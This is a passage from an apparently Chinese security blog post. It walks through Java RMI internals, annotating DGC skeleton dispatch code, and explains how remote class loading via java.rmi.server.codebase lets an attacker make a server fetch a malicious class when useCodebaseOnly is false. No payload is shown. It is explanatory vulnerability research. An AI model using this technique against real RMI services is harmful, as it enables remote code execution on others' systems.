class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 调用的目标远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call 远程调用对象，可以从中获取操作和方法参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> op 操作编号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 如果无法序列化返回结果或释放输入/输出流，抛出此异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote obj, RemoteCall call, <span class="type">int</span> op)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> hash;  <span class="comment">// 用于匹配存根与骨架的哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取远程调用头部</span></span><br><span class="line">    ObjectInput in;</span><br><span class="line">    in = call.getInputStream();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试加载骨架类（DGCImpl_Skel）并根据条件设置流</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.rmi.transport.DGCImpl_Skel&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (clazz.isAssignableFrom(skel.getClass())) &#123;</span><br><span class="line">            <span class="comment">// 如果骨架类与当前的 skel 类兼容，则使用仅从代码库中加载的方式</span></span><br><span class="line">            ((MarshalInputStream) in).useCodebaseOnly();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ignore) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调度到骨架 DGCImpl_Skel#dispatch 处理远程对象</span></span><br><span class="line">    skel.dispatch(obj, call, op, hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>DGCImpl_Skel#dispatch</code> 中对应 <code>clean</code> 和 <code>dirty</code> 两种请求的处理都涉及对参数的反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(java.rmi.Remote obj, java.rmi.server.RemoteCall remoteCall, <span class="type">int</span> opnum, <span class="type">long</span> hash)</span></span><br><span class="line">        <span class="keyword">throws</span> java.lang.Exception &#123;</span><br><span class="line">    <span class="comment">// 验证接口哈希值是否匹配</span></span><br><span class="line">    <span class="keyword">if</span> (hash != interfaceHash)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.server.SkeletonMismatchException(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将远程对象转换为 DGCImpl 对象</span></span><br><span class="line">    sun.rmi.transport.<span class="type">DGCImpl</span> <span class="variable">server</span> <span class="operator">=</span> (sun.rmi.transport.DGCImpl) obj;</span><br><span class="line">    <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall) remoteCall;  <span class="comment">// 转换远程调用对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据方法编号 (opnum) 选择调用不同的方法</span></span><br><span class="line">    <span class="keyword">switch</span> (opnum) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// clean(ObjID[], long, VMID, boolean)</span></span><br><span class="line">        &#123;</span><br><span class="line">            java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;</span><br><span class="line">            <span class="type">long</span> $param_long_2;</span><br><span class="line">            java.rmi.dgc.VMID $param_VMID_3;</span><br><span class="line">            <span class="type">boolean</span> $param_boolean_4;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();  <span class="comment">// 获取输入流</span></span><br><span class="line">                $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();  <span class="comment">// 读取远程对象的 ObjID 数组</span></span><br><span class="line">                $param_long_2 = in.readLong();  <span class="comment">// 读取租期</span></span><br><span class="line">                $param_VMID_3 = (java.rmi.dgc.VMID) in.readObject();  <span class="comment">// 读取 VMID</span></span><br><span class="line">                $param_boolean_4 = in.readBoolean();  <span class="comment">// 读取布尔值</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">                call.discardPendingRefs();  <span class="comment">// 丢弃未处理的引用</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);  <span class="comment">// 反序列化异常</span></span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                call.releaseInputStream();  <span class="comment">// 释放输入流</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 调用 server.clean() 方法处理清理操作</span></span><br><span class="line">            server.clean($param_arrayOf_ObjID_1, $param_long_2, $param_VMID_3, $param_boolean_4);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                call.getResultStream(<span class="literal">true</span>);  <span class="comment">// 获取并确认返回流</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);  <span class="comment">// 序列化返回结果异常</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// dirty(ObjID[], long, Lease)</span></span><br><span class="line">        &#123;</span><br><span class="line">            java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;</span><br><span class="line">            <span class="type">long</span> $param_long_2;</span><br><span class="line">            java.rmi.dgc.Lease $param_Lease_3;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();  <span class="comment">// 获取输入流</span></span><br><span class="line">                $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();  <span class="comment">// 读取远程对象的 ObjID 数组</span></span><br><span class="line">                $param_long_2 = in.readLong();  <span class="comment">// 读取租期</span></span><br><span class="line">                $param_Lease_3 = (java.rmi.dgc.Lease) in.readObject();  <span class="comment">// 读取 Lease 对象</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">                call.discardPendingRefs();  <span class="comment">// 丢弃未处理的引用</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);  <span class="comment">// 反序列化异常</span></span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                call.releaseInputStream();  <span class="comment">// 释放输入流</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 调用 server.dirty() 方法处理续租操作</span></span><br><span class="line">            java.rmi.dgc.<span class="type">Lease</span> <span class="variable">$result</span> <span class="operator">=</span> server.dirty($param_arrayOf_ObjID_1, $param_long_2, $param_Lease_3);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);  <span class="comment">// 获取返回流</span></span><br><span class="line">                out.writeObject($result);  <span class="comment">// 将返回的 Lease 对象写入输出流</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);  <span class="comment">// 序列化返回结果异常</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 如果方法编号不在有效范围内，抛出异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RMI-攻击面"><a href="#RMI-攻击面" class="headerlink" title="RMI 攻击面"></a>RMI 攻击面</h2><h3 id="远程类加载"><a href="#远程类加载" class="headerlink" title="远程类加载"></a>远程类加载</h3><p>RMI 的一个特点就是动态加载类，如果当前 JVM 中没有某个类的定义，它可以从远程 URL 去下载这个类的 class。</p>
<p>例如当客户端调用远程方法时，参数对象会被序列化后传输到服务器端。为了成功传输和处理这些对象，服务器端需要能够反序列化客户端传递的对象。如果服务器端的类路径中没有相应的类，反序列化就会失败，抛出 <code>ClassNotFoundException</code>。</p>
<p>为了解决这个问题，RMI 提供了一种 <strong>动态类加载</strong> 机制。当客户端传递的对象在服务器端找不到时，服务器会根据配置自动从指定的位置加载相应的类字节码。这通常是通过设置 <code>java.rmi.server.codebase</code> 属性来实现的，并且服务端和客户端都支持这个功能。</p>
<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p><code>java.rmi.server.codebase</code> 属性可以在 Java 代码中通过 Java 启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:8000/&quot;</code> 来设置，也可以使用如下代码设置：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);`</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>如果服务器的 JDK 版本较低（ <strong>JDK 6u45、7u21</strong> 以下）时，可以由客户端设置 <code>java.rmi.server.codebase</code>，服务器会将本地的 <code>codebase</code> 自动设置为客户端指定的值。</p>

    </div>
  </div>

<p>然而无论是客户端还是服务端要远程加载类时，出于安全考虑，会进行一系列权限控制。这些控制由 <strong>Java 安全管理器</strong> (<code>SecurityManager</code>) 和 <strong>安全策略文件</strong>（<code>java.security.policy</code>）决定。</p>
<p>首先是 Java 安全管理器，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类。通常我们使用如下代码设置安全管理器：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有安全管理器，则创建并设置一个新的安全管理器实例。</span></span><br><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外我们还需要设置 <strong><code>java.security.policy</code></strong> 为指定的安全策略文件文件来确保 <strong>动态类加载</strong> 能够正常工作并且不引发安全异常。</p>
<p><code>java.security.policy</code> 可以使用启动参数 <code>-Djava.security.policy=rmi.policy</code> 来指定，也可以使用如下代码指定：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br></pre></td></tr></table></figure></div>

<p>在安全策略文件（这里我们指定为 <code>rmi.policy</code>）中需要授予执行 RMI 相关操作的权限。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>我们在客户端 RMI 远程调用时传入了一个服务端不存在的类对象 <code>Calc</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello.sayHello(<span class="keyword">new</span> <span class="title class_">Calc</span>());</span><br></pre></td></tr></table></figure></div>

<p>服务端在反序列时 <code>Calc</code> 对象时发现 <code>Calc</code> 类不存在，于是会从 <code>java.rmi.server.codebase</code> 指定的 URL 中寻找 <code>Calc.class</code> 并加载。加载完 <code>Calc.class</code> 便会对传入的 <code>Calc</code> 对象参数进行反序列化。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>反序列化触发类加载的调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">findClass:361, URLClassLoader (java.net)</span><br><span class="line">loadClass:424, ClassLoader (java.lang)</span><br><span class="line">loadClass:411, ClassLoader (java.lang)</span><br><span class="line">loadClass:349, Launcher$AppClassLoader (sun.misc)</span><br><span class="line">loadClass:411, ClassLoader (java.lang)</span><br><span class="line">loadClass:1207, LoaderHandler$Loader (sun.rmi.server)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">loadClassForName:1221, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:453, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:186, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:637, RMIClassLoader$2 (java.rmi.server)</span><br><span class="line">loadClass:264, RMIClassLoader (java.rmi.server)</span><br><span class="line">resolveClass:219, MarshalInputStream (sun.rmi.server)</span><br><span class="line">readNonProxyDesc:1868, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:1751, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2042, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, UnicastRef (sun.rmi.server)</span><br><span class="line">unmarshalParametersUnchecked:628, UnicastServerRef (sun.rmi.server)</span><br><span class="line">unmarshalParameters:616, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:338, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1367380156 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure></div>

<p>我们发现实际上通过 URL 远程加载类的类加载器是 <code>sun.rmi.server.LoaderHandler$Loader</code> 这个类加载器是 <code>URLClassLoader</code> 的子类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Loader 是由 RMIClassLoader 的静态方法创建的</span></span><br><span class="line"><span class="comment"> * RMI 类加载器的实际实现类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 它继承自 URLClassLoader，具备从指定 URL（如 codebase）加载类的能力。</span></span><br><span class="line"><span class="comment"> * 这个 Loader 会被用于在远程调用中根据传递过来的 codebase URL</span></span><br><span class="line"><span class="comment"> * 动态加载类或接口，从而实现跨 JVM 的类型传输与反序列化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Loader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中在 <code>MarshalInputStream#resolveClass</code> 中，<code>readLocation</code> 可以读取我们指定的 <code>codebase</code>。我们只需要在攻击方添加如下代码设置 <code>codebase</code>，那么被攻击方在执行 <code>readLocation</code> 时就可以得到攻击方的 <code>codebase</code> 然后到攻击方指定的 url 上加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>不过这需要 <code>useCodebaseOnly</code> 是为 <code>false</code> 才能远程指定任意 <code>codebase</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回类在流中的位置注解（location）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 该方法可以被子类重写，以实现从其他位置读取注解信息的机制；</span></span><br><span class="line"><span class="comment"> * 本类默认的实现是直接从输入流中读取下一个对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在 RMI 的场景中，这个注解通常是一个 codebase URL 字符串，</span></span><br><span class="line"><span class="comment"> * 用于指示类定义应当从哪里加载。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 一个 Object 类型的注解（通常为 String 类型的 URL）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 如果读取过程中发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果反序列化注解对象失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readLocation</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> readObject(); <span class="comment">// 默认行为：从输入流读取下一个对象，作为类注解</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 始终读取由 MarshalOutputStream 写入的注解（annotation），</span></span><br><span class="line"><span class="comment"> * 该注解描述了类应当从哪里加载（即 codebase 的来源位置）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这一步通常出现在远程对象反序列化的过程中，</span></span><br><span class="line"><span class="comment"> * 用于获取服务端提供的类加载路径信息。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">annotation</span> <span class="operator">=</span> readLocation();</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果 &quot;java.rmi.server.useCodebaseOnly&quot; 属性为 true，</span></span><br><span class="line"><span class="comment"> * 或者调用了 useCodebaseOnly() 方法，或者注解（annotation）不是字符串，</span></span><br><span class="line"><span class="comment"> * 则使用本地类加载器和 &quot;java.rmi.server.codebase&quot; 属性指定的 URL 加载类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 否则，将使用注解中的 codebase URL 创建的类加载器来加载类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">String</span> <span class="variable">codebase</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!useCodebaseOnly &amp;&amp; annotation <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    codebase = (String) annotation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 根据指定的 codebase、类名以及默认类加载器加载类</span></span><br><span class="line">    <span class="keyword">return</span> RMIClassLoader.loadClass(codebase, className, defaultLoader);</span><br><span class="line">&#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p>然而从 <strong>JDK 6u45、7u21</strong> 开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是 <code>true</code>，也就是说我们不能指定目标服务器从任意地址加载恶意类。这导致 RMI 远程类加载这种攻击方式变得很鸡肋。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * “java.rmi.server.useCodebaseOnly” 属性的值，</span></span><br><span class="line"><span class="comment"> * 在类初始化阶段进行缓存。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 默认值为 true。也就是说，如果该属性不存在或其值不等于 &quot;false&quot;，</span></span><br><span class="line"><span class="comment"> * 则默认值为 true；仅当该属性存在且其值为 &quot;false&quot; 时，才会被设置为 false。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">useCodebaseOnlyProperty</span> <span class="operator">=</span></span><br><span class="line">    !java.security.AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">sun</span>.security.action.GetPropertyAction(</span><br><span class="line">            <span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;true&quot;</span>))</span><br><span class="line">        .equalsIgnoreCase(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果为 true，则只从 &quot;java.rmi.server.codebase&quot; 属性所指定的 URL </span></span><br><span class="line"><span class="comment"> * 来加载本地无法获取的类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">useCodebaseOnly</span> <span class="operator">=</span> useCodebaseOnlyProperty;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>LoaderHandler#loadClass</code> 中会通过 <code>pathToURLs</code> 函数将我们远程指定的 <code>codebase</code> 转换成 <code>URL</code> 数组。</p>
<p>如果我们没有远程指定 <code>codebase</code> 或者 <code>useCodebaseOnly</code> 值为 <code>true</code> 导致 <code>codebase</code> 为 <code>null</code>，则会通过 <code>getDefaultCodebaseURLs</code> 初始化 <code>url</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从网络位置（一个或多个 URL）加载指定名称的类。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 在尝试通过远程 codebase 加载之前，优先尝试使用给定的 &quot;默认类加载器&quot;（defaultLoader）进行类解析。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase      表示类下载路径的 URL 字符串（可以是多个 URL，用空格分隔）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name          要加载的类的全限定名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> defaultLoader 默认类加载器，优先使用此加载器加载类（如果提供）</span></span><br><span class="line"><span class="comment"> 